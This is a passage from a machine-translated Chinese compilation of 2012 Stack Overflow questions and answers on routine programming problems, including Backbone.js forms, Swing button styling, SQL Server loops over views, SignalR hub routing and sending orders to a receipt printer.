    , url: "/Application/PersonList"
});
//Views
var PersonItemView = Backbone.Form.extend({
    tagName: "li",
    events: {
        'click button.delete': 'remove',
        'change input': 'change'
    },
    initialize: function (options) {
        console.log("ItemView init");
        PersonItemView.__super__.initialize.call(this, options);
        _.bindAll(this, 'render', 'remove');
        console.log("ItemView set attr = " + options);
    },
    render: function () {
        PersonItemView.__super__.render.call(this);
        $('fieldset', this.el).append("<button class=\"delete\" style=\"float: right;\">Delete</button>");
        return this;
    },
    change: function (event) {
        var target = event.target;
        console.log('changing ' + target.id + ' from: ' + target.defaultValue + ' to: ' + target.value);
    },
    remove: function () {
        console.log("delete button pressed");
        this.model.destroy({ success: function () { alert('person deleted successfully'); } });
        return false;
    }
});

var PersonListView = Backbone.View.extend({
    el: $("#application_fieldset"),

    events:
        {
            'click button#add': 'addPerson',
            'click button#save': 'save2db'
        },
    initialize: function () {
        console.log("PersonListView Constructor");
        _.bindAll(this, 'render', 'addPerson', 'appendItem', 'save');
        this.collection = new PersonList();
        this.collection.bind('add', this.appendItem);
        //this.collection.fetch();
        this.collection.add([new PersonItem()]);
        console.log("collection length = " + this.collection.length);
    },
    render: function () {
        var self = this;
        console.log(this.collection.models);
        $(this.el).append("<button id='add'>Add Person</button>");
        $(this.el).append("<button id='save'>Save</button>");
        $(this.el).append("<fieldset><legend>Contact</legend><ul id=\"anchor_list\"></ul>");
        _(this.collection.models).each(function (item) {
            self.appendItem(item);
        }, this);
        $(this.el).append("</fieldset>");
    },
    addPerson: function () {
        console.log("addPerson clicked");
        var item = new PersonItem();
        this.collection.add(item);
    },
    appendItem: function (item) {
        var itemView = new PersonItemView({ model: item });
        $('#anchor_list', this.el).append(itemView.render().el);
    },
    save2db: function () {
        var self = this;
        console.log("PersonListView save");
        _(this.collection.models).each(function (item) {
            console.log("item = " + item.toJSON());
            var cid = item.cid;
            console.log("item.set");
            item.set({
                Title: $('#' + cid + '_Title').val(),
                Salutation: $('#' + cid + '_Salutation').val(),
                FirstName: $('#' + cid + '_FirstName').val(),
                LastName: $('#' + cid + '_LastName').val(),
                MiddleName: $('#' + cid + '_MiddleName').val(),
                NameSuffix: $('#' + cid + '_NameSuffix').val(),
                StreetAddress: $('#' + cid + '_StreetAddress').val(),
                City: $('#' + cid + '_City').val(),
                State: $('#' + cid + '_State').val(),
                ZipCode: $('#' + cid + '_ZipCode').val(),
                PhoneNumber: $('#' + cid + '_PhoneNumber').val(),
                DateOfBirth: $('#' + cid + '_DateOfBirth').find('input').val()
            });

            if (item.isNew()) {
                console.log("item.isNew");
                self.collection.create(item);
            } else {
                console.log("!item.isNew");
                item.save();
            }
        });
        return false;
    }
});
var personList = new PersonList();
var view = new PersonListView({ collection: personList });
personList.fetch({ success: function () {
    $("#application_fieldset").append(view.render());
}
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:36:04.643

我发现了我的错误。我需要在我的 PersonListView 初始化中删除新 PersonList 的创建。

```
 this.collection = new PersonList();//removed this line 
```

希望这段代码可以帮助有主干形式的人。:)

# java - 在 Swing 应用程序中扩展系统外观

> ID：12624586
> 
> 赞同：1
> 
> 时间：2012-09-27T15:11:16.903
> 
> 标签：java, swing, jpanel, jbutton, look-and-feel

我想为 Swing 应用程序使用系统外观。所以我使用了`getSystemLookAndFeelClassName()`效果很好的方法。

```
UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); 
```

但是，现在我想更改所有`JButtons`应用程序（在所有我`JFrames`的 , `JDialogs`, `JOptionPanes`,`JFileChoosers`等中）并且只有`JButtons`. 所以我想知道如何扩展系统的外观和感觉，以保持它除了`JButtons`（和`JPanels`我想要的灰色背景）之外的所有组件。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T14:33:45.293

最后，我扩展了系统的外观和感觉，如下所示：

```
UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
UIManager.put("ButtonUI", "com.my.package.MyButtonUI");
UIManager.put("Panel.background", Color.green); 
```

与`MyButtonUI`：

```
public class MyButtonUI extends BasicButtonUI {

    public static final int BUTTON_HEIGHT = 24;

    private static final MyButtonUI INSTANCE = new MyButtonUI ();

    public static ComponentUI createUI(JComponent b) {
        return INSTANCE;
    }

    @Override
    public void paint(Graphics g, JComponent c) {
        AbstractButton button = (AbstractButton) c;
        Graphics2D g2d = (Graphics2D) g;
        final int buttonWidth = button.getWidth();
        if (button.getModel().isRollover()) {
            // Rollover
            GradientPaint gp = new GradientPaint(0, 0, Color.green, 0, BUTTON_HEIGHT * 0.6f, Color.red, true);
            g2d.setPaint(gp);
        } else if (button.isEnabled()) {
            // Enabled
            GradientPaint gp = new GradientPaint(0, 0, Color.red, 0, BUTTON_HEIGHT * 0.6f, Color.gray, true);
            g2d.setPaint(gp);
        } else {
            // Disabled
            GradientPaint gp = new GradientPaint(0, 0, Color.black, 0, BUTTON_HEIGHT * 0.6f, Color.blue, true);
            g2d.setPaint(gp);
        }
        g2d.fillRect(0, 0, buttonWidth, BUTTON_HEIGHT);
        super.paint(g, button);
    }

    @Override
    public void update(Graphics g, JComponent c) {
        AbstractButton button = (AbstractButton) c;
        if (isInToolBar(button)) {
            // Toolbar button
            button.setOpaque(false);
            super.paint(g, button);
        } else if (button.isOpaque()) {
            // Other opaque button
            button.setRolloverEnabled(true);
            button.setForeground(Color.white);
            paint(g, button);
        } else {
            // Other non-opaque button
            super.paint(g, button);
        }
    }

    private boolean isInToolBar(AbstractButton button) {
        return SwingUtilities.getAncestorOfClass(JToolBar.class, button) != null;
    }
} 
```

注意：我强烈推荐这个链接：[http](http://tips4java.wordpress.com/2008/10/09/uimanager-defaults/) ://tips4java.wordpress.com/2008/10/09/uimanager-defaults/ （来自 Robin）

谢谢你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T16:34:19.983

您还可以创建自己的按钮类，例如扩展 JButton 的 CustomButton，进行所有更改并使用它来代替标准的 JButton。这样，您可以同时使用自定义和标准按钮 - 如果您改变主意并想在某处添加标准 JButton ;)

# java - Java：将外部 dll 复制到输出文件夹

> ID：12624589
> 
> 赞同：0
> 
> 时间：2012-09-27T15:11:28.210
> 
> 标签：java, dll, build

我的项目依赖于一个 jar，它又加载了一个外部 dll：

```
static {
    System.loadLibrary("jpcap");
} 
```

该 dll 与创建 jar（使用 Ant 构建）的项目一起提供。但是，它不会复制到复制主项目输出的输出类文件夹中。因此我在运行时收到错误：

java.library.path 中没有 jpcap

如何设置我的项目，以便将 dll 复制到我的主项目的类文件夹中？

非常感谢，大卫

# javascript - 从按钮中间打开下拉菜单

> ID：12624592
> 
> 赞同：1
> 
> 时间：2012-09-27T15:11:39.467
> 
> 标签：javascript, css, button, dojo

我正在设计（或尝试）一个地图应用程序，并且有一个 dojo.fx.toggler 函数，我需要在按钮下方居中显示该函数。默认似乎是从左侧打开。但是，由于放置了我的按钮，它会超出页面边缘，导致用户需要滚动才能查看所有内容。

我已经尝试过基本的 CSS 样式来尝试这个没有运气。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:32:42.163

由于 dojo.fx.Toggler 切换现有元素并且不创建任何元素，因此问题似乎在于您如何首先定位元素。您应该将元素向右移动：

```
#toggledElementId
{
  position: relative;
  left: 50px;
} 
```

# configuration - 如何使用 autoconf 简化对交叉编译的支持

> ID：12624600
> 
> 赞同：1
> 
> 时间：2012-09-27T15:12:21.277
> 
> 标签：configuration, autoconf

我维护一个包自动配置，用于`PKG_CHECK_MODULES`查找我的代码所依赖的库。我想让旨在交叉编译我的包的人更容易：主要问题`PKG_CHECK_MODULES`是它获取 BUILD 系统信息而不是 HOST。

我的方法如下：我不使用HOST系统的rootfs，而是分别编译我的包所依赖的每个包。然后，我希望能够在调用srcipt时强制使用`DEPENDSON_LIBS`or的值。这是一个好方法吗？如何编写 configure.in 以允许这样做？`DEPENDSON_CFLAGS``./configure`

注意：我试过`AC_ARG_VAR` 没有成功......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-28T15:15:38.220

`PKG_CHECK_MODULES`首先检查是否`*host-prefix*-pkg-config`存在，然后回退到无前缀`pkg-config`（这可能会产生令人困惑的结果）。

我不确定我是否理解您的方法（第二段），但无论如何我都会为用户设置正确的路径。您可以添加`AC_CHECK_LIB`after`PKG_CHECK_MODULES`以检查选择的库是否与编译器用于同一系统。

交叉编译的用户可能`*host-prefix*-pkg-config`已经安装了，例如一些linux发行版除了MinGW交叉编译器外还打包了它。如果没有，设置适当的环境就足够了。变量。Autotools Mythbuster 推荐[设置这些变量的包装器](http://www.flameeyes.eu/autotools-mythbuster/pkgconfig/cross-compiling.html)。

万不得已，用户可以直接设置`*_CFLAGS`和`*_LIBS`。

# ruby-on-rails - 延迟作业交付失败

> ID：12624602
> 
> 赞同：1
> 
> 时间：2012-09-27T15:12:23.820
> 
> 标签：ruby-on-rails, delayed-job

我的报告控制器中有这个方法：

```
def send_status
 date = Date.today
 reports = current_user.reports.for_date(date)
 ReportMailer.status_email(current_user, reports, date).deliver
 reports.update_all(:sent_mail => true)
 head :ok
 rescue => e
 render text: e.message, status: :bad_request
end 
```

发送此状态时我无法提出任何请求，因此我使用了延迟作业，替换

ReportMailer.status_email(current_user, reports, date).deliver with ReportMailer.status_email(current_user, reports, date).send_later(:send_status)

但我收到 400 错误的交货请求。有帮助吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-06T23:18:33.380

避免将对象传递给delayed_job，而是使用ids：（您的delayed_job 进程可能会静默失败）

```
ReportMailer.delay.status_email(current_user.id, reports_ids, date) 
```

在 status_email 中，拉出 current_user 并报告：

```
def status_email(userid, reports_ids, date)
  current_user = User.find_by_id(userid)
  reports = Report.find_all_by_id(reports_ids)
  ...
end 
```

# eclipse - 如何导出具有依赖项的 Eclipse 插件？

> ID：12624603
> 
> 赞同：2
> 
> 时间：2012-09-27T15:12:25.140
> 
> 标签：eclipse, eclipse-plugin

所以我已经开始编辑一个现有的插件。因此，它具有依赖性。我想把这个插件放到另一个 Eclipse IDE 中（不是我现在的）。这个 Eclipse IDE 不会安装依赖的插件 jar。现在我正在使用 droppins 文件夹，但是这并没有安装我需要的依赖项。那么我将这个插件安装到另一个 Eclipse IDE 中的最佳方法是什么？并作为一个完整的包/简单的一次性步骤。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T15:44:16.637

using 的问题`/dropins`在于它不执行依赖解析来查找并包含所有必需的依赖。相反，您需要通过 p2（Eclipse 的软件包安装基础结构）进行安装 - 在 Eclipse 中，当您选择*帮助*>*安装新软件时，您会得到它...*

*   创建一个包含您的插件的**功能项目，将您的插件包含在功能中。**在功能编辑器的**Dependencies**选项卡上，使用 Compute 按钮来声明插件所需的依赖项（或者如果您愿意，可以手动添加它们）。
*   为您的功能创建**更新站点项目**。包括您的功能，构建站点（右键单击`site.xml`文件），然后使用*帮助*>*安装新软件...*选择本地更新站点并从中进行安装。

Eclipse Help Contents 可以对所有这些进行更多解释，但这是一个非常简单的过程。

# cakephp - 在 CakePHP 中实现不管 URL 的静态文件

> ID：12624604
> 
> 赞同：0
> 
> 时间：2012-09-27T15:12:26.940
> 
> 标签：cakephp, path

我正在使用 CakePHP 开发一个网站，但我有一个非常基本的疑问：

当我在本地工作时，我使用虚拟主机，`/`这意味着我的项目的真正根，然后我可以定义所有指向静态内容的链接，例如`/static/content.css`（ie）。但是，当我测试网站时，我需要创建一个`beta`子目录，然后链接应该更改为`/beta/static/content.css`.

使用类似的相对路径`static/content.css`不是解决方案，因为这只能在主页中使用，而在其他控制器和操作上，文件是无法访问的，因为系统会在`controller/action/static/content.css`.

我的第一个解决方案是创建一个全局常量，我必须在我测试页面的每个地方（我的本地服务器、我的远程服务器、客户端远程服务器......）重新定义它，但我希望 CakePHP 提供一种方法来解决这个问题更优雅的方式。

感谢您的关注和帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:29:54.600

这就是为什么你不应该对任何东西使用静态 url，而是做一些类似`echo $this->Html->css('your_file');`的事情`/webroot/css/your_file.css`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T00:14:01.867

对我来说听起来很奇怪。为什么不在你的 git/svn/whatever repo 中创建一个名为“beta”的分支，只需使用：example.com（实时站点）和 beta.example.com（beta 站点）来测试单独的文件夹、虚拟主机和数据库。你说*testing*，所以我不会尝试在实时数据库上使用 beta 功能。

# jquery - jquery：重叠的上滑 div。点击快速搞砸了

> ID：12624605
> 
> 赞同：0
> 
> 时间：2012-09-27T15:12:27.093
> 
> 标签：jquery, html, slideup, overlapping

我在使用 jquery 滑动 div 时遇到问题。如果我点击链接快速（例如第一个链接和第二个链接），div 将重叠（他们不应该做什么！）。这是我的代码：

```
<script type="text/javascript">

$(document).ready(function() {    
    $("div.slide").hide();

$('a.link').on('click', function(e) {

  e.preventDefault();
  var slideSelector = '#' + $(this).attr('id').replace('link', 'slide');

  $('div.slide').not(slideSelector).slideUp(1000, 'easeOutQuart', function() {
    $(slideSelector).slideDown(1000, 'easeOutQuart');
  });

  });      

});

</script> 
```

看看[**演示**](http://jsfiddle.net/eEkk6/)，看看我的意思。我会很高兴收到你们的来信！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:20:50.670

嗯，只需添加一个布尔值来检查它是否被点击？我用触控板快速测试了它，它应该可以工作

```
$(document).ready(function() 
{    
    $("div.slide").hide();
    var clicked = false;
    $('a.link').on('click', function(e) 
   {

       if(!clicked)
       {
        e.preventDefault();
        clicked = true;
        var slideSelector = '#' + $(this).attr('id').replace('link', 'slide');

      $('div.slide').not(slideSelector).slideUp(1000, function() 
      {
          $(slideSelector).slideDown(1000, function(){
          clicked = false;
          });
      });
        }

  });      

});​ 
```

# xcode - 从导航栏中删除渐变，使其看起来很坚固？

> ID：12624606
> 
> 赞同：0
> 
> 时间：2012-09-27T15:12:31.600
> 
> 标签：xcode, gradient, navbar

是否可以使用倾斜颜色使导航栏显示为实心？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T00:04:04.823

我不这么认为，但你可以画一个 1 点实心图像并设置：

一个类别的起点可能类似于

```
- (void)ps_setBackgroundColor:(UIColor *)color;
{
  UIGraphicsBeginImageContextWithOptions(CGSizeMake(1, 1), YES, 1);

  [color setFill];
  CGContextFillRect(UIGraphicsGetCurrentContext(), CGRectMake(0, 0, 1, 1));
  UIImage *backgroundImage = UIGraphicsGetImageFromCurrentImageContext();

  UIGraphicsEndImageContext();

  [self setBackgroundImage:backgroundImage forBarMetrics:UIBarMetricsDefault];
} 
```

上面的一个示例用法是

```
[self.navigationController.navigationBar ps_setBackgroundColor:[UIColor redColor]]; 
```

# ruby - 查找特定数组即值的哈希键

> ID：12624609
> 
> 赞同：0
> 
> 时间：2012-09-27T15:12:44.880
> 
> 标签：ruby

给定一个数组哈希，我需要获取数组第一个元素最小的键。

例如，对于：

```
h = { :a => [8,9,1], :b => [7,2,3], :c => [1,7,3] } 
```

我想得到**:c**作为结果，因为**1**是 [8,7,1] 的最小值

我怎样才能优雅地做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:17:42.953

```
h.key(h.values.min_by &:first) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:22:55.627

```
h.sort_by { |k,v| v[0] }[0][0]
# or (equivalent)
h.sort_by { |k,v| v.first }.first.first 
```

通过使用默认的数组比较器，这甚至可以缩短为：

```
h.sort_by { |k,v| v }[0][0] 
```

# sql - SQL我如何循环浏览我的视图列表

> ID：12624610
> 
> 赞同：3
> 
> 时间：2012-09-27T15:12:46.047
> 
> 标签：sql, sql-server, loops, views

**问题**
我如何循环查看我的 SQL DB 中的视图列表？

**背景和尝试的事情**
我已经用谷歌搜索了大约 2 个小时，我发现了很多方法来遍历我的数据库的不同属性。我可以遍历一个表列表、一个列列表和一个计数列表，但我还没有找到任何可以让我遍历视图列表的东西。

**循环遍历表的代码我试图修改**

[我用来获取以下示例代码的链接](http://www.mssqltips.com/sqlservertip/1905/iterate-through-sql-server-database-objects-without-cursors/)

```
--List all the tables of current database and total no rows in it
EXEC sp_MSForEachTable 'SELECT ''?'' as TableName, COUNT(1) 
as TotalRows FROM ? WITH(NOLOCK)' 

--List all the tables of current database and space used by it EXECUTE sp_MSforeachtable 'EXECUTE sp_spaceused [?];'; 
GO 
```

**我想做的 sudo 代码**

```
loop through each view in list
run query here for each view
output results 
```

**请求帮助**

任何人都可以将我链接到有关如何执行此操作的更多信息或提供一些示例代码吗？非常感谢所有帮助！谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:27:37.140

One way to do this is using cursors. And you are definitely gonna need dynamic SQL, so first go to [this link](http://www.sommarskog.se/dynamic_sql.html). Then, you can try the following:

```
DECLARE @View VARCHAR(200), @Query VARCHAR(MAX)

DECLARE YourView CURSOR LOCAL STATIC READ_ONLY FORWARD_ONLY FOR
SELECT name
FROM sys.views

OPEN YourView
FETCH NEXT FROM YourView INTO @View
WHILE @@FETCH_STATUS = 0
BEGIN
    SET @Query = 'SELECT '''+@View+''' ViewName, COUNT(1) Rows
                  FROM '+QUOTENAME(@View)  -- Your code here
    PRINT(@Query)
    FETCH NEXT FROM YourView INTO @View
END
CLOSE YourView
DEALLOCATE YourView 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T15:27:51.383

有很多方法可以做到这一点，游标，手动循环。可能有多种方法可以以基于集合的方式找到您想要的内容（即神秘查询的答案）。无论哪种方式，如您所说，您都需要动态 sql。

**选项 1 - so/so 方法**

```
SET NOCOUNT ON;
DECLARE @Views as TABLE (Object_id int, name nvarchar(200));

INSERT INTO @Views (Object_ID, name)
SELECT      Object_ID, name 
FROM        sys.views

DECLARE @viewName   nvarchar(200) = (select top 1 name from @Views);
DECLARE @sql        nvarchar(max) = '';

WHILE(Exists(select 1 from @Views)) BEGIN
    SET @sql = 'select count(*) FROM ' + @ViewName +';'
    --exec(@sql);   --careful you're not accepting user input here!
    Print (@sql);

    DELETE FROM @Views where name = @viewName;
    SET @ViewName = (select top 1 name from @Views);
END; 
```

**选项 2 - 更具弹性的方法**
*在我的小测试数据库中尝试此方法时，我意识到我的第一个解决方案（以及所有其他解决方案）存在潜在问题。* 视图*可能会*过时——这意味着底层对象会像列重命名一样发生变化。所有其他解决方案都将引发错误并停止处理。如果您正在执行大/长查询，这可能是不可取的。所以我添加了一点错误处理来记录错误并继续处理。

```
SET NOCOUNT ON;
DECLARE @ViewCount   int                = 0;
DECLARE @Counter     int                = 0;
DECLARE @sql         nvarchar(max)    = '';
DECLARE @viewName    nvarchar(200)    = ''
DECLARE @Views    as TABLE (  rownum int identity(1,1), 
                              name nvarchar(200), 
                              Primary Key clustered  (rownum)
                            );

INSERT INTO  @Views (name)
SELECT       name 
FROM         sys.views;

SET          @ViewCount = SCOPE_IDENTITY();

WHILE(@Counter < @ViewCount) BEGIN
    SET @Counter = @Counter+1;

    SELECT  @sql = 'select count(*) FROM ' + name +';', @viewName = name
    FROM    @Views
    WHERE    rownum = @Counter;

    BEGIN TRY
        -- exec(@sql); --careful you're not accepting user input here!
        Print (@sql);
    END TRY BEGIN CATCH
        Print ('ERROR querying view - ' + @viewname + ' // ' + ERROR_MESSAGE());
    END CATCH
END; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:30:45.690

我正在使用 ROW_NUMBER() 和 INFORMATION_SCHEMA 来遍历视图。

这是工作清单的快速浏览：

```
SELECT TABLE_CATALOG + '.' + TABLE_SCHEMA + '.' + TABLE_NAME AS ViewName
    ,ROW_NUMBER() OVER (
        ORDER BY TABLE_CATALOG
            ,TABLE_SCHEMA
            ,TABLE_NAME
        )
FROM INFORMATION_SCHEMA.VIEWS 
```

这是存储的过程：

```
CREATE PROCEDURE LoopThroughViews
AS
DECLARE @sql VARCHAR(max)
    ,@tableCount INT
    ,@i INT = 0

SELECT @tableCount = COUNT(*)
FROM INFORMATION_SCHEMA.VIEWS

WHILE (@tableCount >= @i)
BEGIN
    SELECT @sql = 'select * from ' + ViewName
    FROM (
        SELECT TABLE_CATALOG + '.' + TABLE_SCHEMA + '.' + TABLE_NAME AS ViewName
            ,ROW_NUMBER() OVER (
                ORDER BY TABLE_CATALOG
                    ,TABLE_SCHEMA
                    ,TABLE_NAME
                ) AS ViewNum
        FROM INFORMATION_SCHEMA.VIEWS
        ) x
    WHERE @i = ViewNum

    EXEC(@sql)

    SET @i = @i + 1
END 
```

最后是电话：

```
EXEC LoopThroughViews 
```

# c# - 有没有更好的方法来实现耗时的启动屏幕加载程序？

> ID：12624612
> 
> 赞同：1
> 
> 时间：2012-09-27T15:12:47.127
> 
> 标签：c#, .net, winforms, splash-screen

我有一个使用许多控件的应用程序，这些控件可能需要很长时间才能初始化（大约 10 到 30 秒）。因此，我为我的应用程序使用了启动画面来加载它们，并向用户呈现某种正在发生的事情的满足感。我显示一个旋转的 gif 和一个进度条。

因为我正在预加载控件，所以似乎唯一的方法是在主 UI 线程上。然后我发现了 Microsoft.VisualBasic.ApplicationServices。现在我像这样做我的spalsh屏幕。

**程序.cs：**

```
using System;
using System.Reflection;
using System.Windows.Forms;
using Spectrum.Foxhunt.Forms;
using Spectrum.UI;
using Microsoft.VisualBasic.ApplicationServices;

namespace Spectrum.Foxhunt
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            new SplashLoader().Run(args);
        }
    }

    class SplashLoader : WindowsFormsApplicationBase
    {
        private Main main;
        private Splash splash;

        public SplashLoader()
        {
            main = new Main();
            splash = new Splash();
        }

        protected override void OnCreateSplashScreen()
        {
            this.SplashScreen = splash;
        }

        protected override void OnCreateMainForm()
        {
            main.SplashScreenWork(splash);
            this.MainForm = main;
        }
    }
} 
```

**飞溅.cs：**

只是一个带有代表我的应用程序、版本信息、旋转 gif 和进度条的图形的表单。

```
namespace Spectrum.Foxhunt.Forms
{
    public partial class Splash : Form
    {
        public int Progress { set { progress.Value = value; } }

        public Splash()
        {
            InitializeComponent();

            version.Text = "Version " + typeof(Main).Assembly.GetName().Version;
        }
    }
} 
```

**主要.cs：**

有一个空的构造函数和我的方法，它在显示初始屏幕时完成所有工作。

```
public Main()
{
    InitializeComponent();
}

public void SplashScreenWork(Splash splash)
{
    // Create time-consuming control
    splash.Progress = 25;
    // Create time-consuming control
    splash.Progress = 50;
    // Create time-consuming control
    splash.Progress = 75;
    // Create time-consuming control
    splash.Progress = 100;
} 
```

我喜欢这种方法，因为它似乎消除了我在后台工作人员中尝试执行这项工作时遇到的线程问题。而且，尽管在后台进行了所有工作，但我在启动画面中的旋转 gif 继续旋转。

话虽如此，我想知道是否有更好的方法来实现加载控件的启动屏幕，同时仍然允许旋转 gif 旋转和进度条在启动屏幕上更新。

# haml - 如何在 Ack 搜索中添加 hamstache？

> ID：12624614
> 
> 赞同：2
> 
> 时间：2012-09-27T15:12:56.427
> 
> 标签：haml, mustache, ack

Ack 没有搜索我的 .hamstache 文件。如何将其包含在搜索中？

我的 .ackrc 文件如下所示：

```
--type-add
ruby=haml

--type-add
ruby=slim

--type-add
js=.coffee

--type-set
coffee=.coffee

--type-add
haml=hamstache 
```

当我对项目进行搜索时，我收到以下消息：

```
ack: --type-add: Type "haml" does not exist, creating with "hamstache" ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T20:38:40.537

警告只是警告，而不是错误。您可以放心地忽略它。

`--type-add`用于添加到已经存在的扩展。您希望`--type-set`第一次为文件类型指定扩展名。

但是要小心`--type-set`，因为它会覆盖任何设置。例如，如果你这样做了`--type-set=ruby=.rubytest`，那么*只有*扩展 ack 会识别 is `.rubytest`。

ack 2.0 (in alpha) 有一个调试选项，使调试更容易和更清晰。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T20:24:00.247

在我看来，您缺少文件扩展名`.`之前的文件。`hamstache`

# asp.net-mvc-4 - /signalr/hubs 未在 asp.net mvc4 中加载：抛出 404

> ID：12624615
> 
> 赞同：15
> 
> 时间：2012-09-27T15:13:08.510
> 
> 标签：asp.net-mvc-4, http-status-code-404, signalr, signalr-hub

这就是我所做的。

1.  我使用 nuget 为我的 MVC4 项目获取 SignalR。
2.  在我的控制器中创建了一个 MyHub 类（SignalRTestController.cs）
3.  在索引操作中，尝试从集线器外部广播消息并返回视图。
4.  在视图中，引用了所有脚本和 /signalr/hubs。

问题是找不到 /signalr/hubs（抛出 404）。

我的项目有区域，结构如下所示：

1.  MVC项目
    *   领域
        *   子文件夹
            *   控制器
                *   SignalRTestController.cs
            *   模型
            *   看法
                *   索引.cshtml
    *   控制器
    *   模型
    *   看法
    *   脚本

signalR 的所有脚本都在 Scripts 文件夹中，我的 SignalRTestController.cs 如下所示：

```
namespace SignalRTest.Controllers
{
public class SignalRTestController : Controller
{
    public ActionResult Index()
    {
        // Do some work here

        // Broadcasting over a Hub from outside of a Hub
        var context = GlobalHost.ConnectionManager.GetHubContext<MyHub>();
        context.Clients.say("Hello SignalR!");

       return View();
    }
}

[HubName("MyHub")]
public class MyHub : Hub
{
    public void Say(string message)
    {
        Clients.sendMessage(message);
    }
}
} 
```

我的任何 Index.cshtml 都引用了所有的 javascripts 和 /signalr/hubs，如下所示： // 其他 Javascripts

脚本类型="text/javascript" src="/signalr/hubs" />

我认为控制器很好，但我没有得到 /signalr/hubs。它抛出 404 并且 Chrome 控制台中的消息是这样的：

资源解释为脚本，但使用 MIME 类型 text/html 传输：“http://www.myproject.com/signalr/hubs”。未捕获的语法错误：意外的令牌 < 集线器：2 未捕获的 SignalR：加载集线器时出错。确保您的集线器引用正确，例如脚本 src='/signalr/hubs'>。

脚本返回为 html 的原因是服务器返回 404 not found。

我不确定出了什么问题。我认为这可能是一个路由问题。我不确定，如果我们需要在项目中为 /signalr/hubs 添加任何路由信息，或者我在这里遗漏了什么。

仅供参考：当我创建一个新的空 MVC 项目并添加 signalR 并开始处理它时，它工作得非常好。无需添加路由。

另外，我在某些地方同时使用默认路由和属性路由。但是控制器 SignalRTestController 不使用属性路由。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-12-07T16:21:23.350

你有调用 RouteTable.Routes.MapHubs()（可能在 Global.asax 中）吗？如果是这样，请尝试摆脱它并查看它是否可以解决您的问题。– 皮特 11 月 16 日 17:22

我一直在玩它。看来在当前版本中（我得到了最新的源代码，因为我需要一个签名的程序集），你必须调用 RouteTable.Routes.MapHubs()。但要使其工作，必须首先调用它（或至少在 RouteConfig.RegisterRoutes() 调用之前）。如果在此之后调用它，MVC 会为其寻找控制器，但这是行不通的。在我使用的通过 nuGet 获得的早期版本中，删除 RouteTable.Routes.MapHubs() 可以解决问题，但现在似乎是必需的。希望这会有所帮助。- 皮特 11 月 27 日 20:53

* * *

显然，您通过将 RouteTable.Routes.MapHubs() 更改为：RouteTable.Routes.MapHubs("~/signalr") 解决了这个问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-11-14T20:45:39.097

MapHubs 现在已过时。在 Owin 启动类中使用 MapSignalR 扩展方法，如下所示：

```
[assembly: OwinStartupAttribute(typeof(signalr_test.Startup))]
namespace signalr_test
{
    public partial class Startup
    {
        public void Configuration(IAppBuilder app)
        {
            ConfigureAuth(app);
            app.MapSignalR(); //can take path also see overloads...
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-01T23:28:35.210

我遇到了同样的问题。这是修复：

Nuget 没有添加所有必要的引用。我重新运行了这个命令：

```
Install-Package Microsoft.AspNet.SignalR -pre 
```

它还添加了一些参考：

*   Microsoft.AspNet.SignalR.Hosting.Aspnet
*   Microsoft.AspNet.SignalR.Hosting.Common

一旦完成，它就像一个冠军！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T09:16:45.883

你的参考有问题。请执行下列操作：

1.  在你 AppStart/Bundle.Config.cs 添加这个：

    ```
    bundles.Add(new ScriptBundle("~/bundles/signalR").Include(
        "~/Scripts/jquery.signalR-{version}.js")); 
    ```

2.  在 layout.cshtml 中添加：

    @Scripts.Render("~/bundles/signalR")

3.  在您使用 signalR 的页面上，请确保您引用 signalR 集线器，如下所示：

/信号器/集线器

就像在此页面上完成的那样： [http](http://blog.devscrum.net/2011/12/getting-started-with-signalr-in-asp-net-mvc/) ://blog.devscrum.net/2011/12/getting-started-with-signalr-in-asp-net-mvc/（它说：“在 index.cshtml 中添加以下代码")

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-03-23T02:45:36.880

就我而言，我不小心在不同位置创建了两个同名的 Hub 类（两个派生自 Hub 的类）。我删除了一个，一切正常。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-02T20:30:29.790

尝试更改`[HubName("MyHub")]`为`[HubName("myHub")]`并确保在 javascript 中创建代理的任何位置进行更新。过去它对我有用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-02-02T18:57:33.007

就我而言，我必须删除 web.config appSettings 中的一个键：

```
<add key="owin:AutomaticAppStartup" value="false" /> 
```

# php - 将数据推送到收据打印机

> ID：12624621
> 
> 赞同：1
> 
> 时间：2012-09-27T15:13:30.100
> 
> 标签：php, javascript, hardware, zebra-printers

我有一个系统，客户可以通过 php 网站订购食物。订单被发送到邮件地址并保存在数据库中。

现在我想添加一个新功能，那就是将数据发送到厨房的收据打印机，因为那里的人就是这么用的。它是爱普生 TM-T88IV。唯一的问题是，我不知道如何。

有收据打印机的api吗？或者我应该制作一个长轮询节点服务器并在网络计算机上监听一些 C 脚本等...

你能把我推向正确的方向吗？

格。

* * *

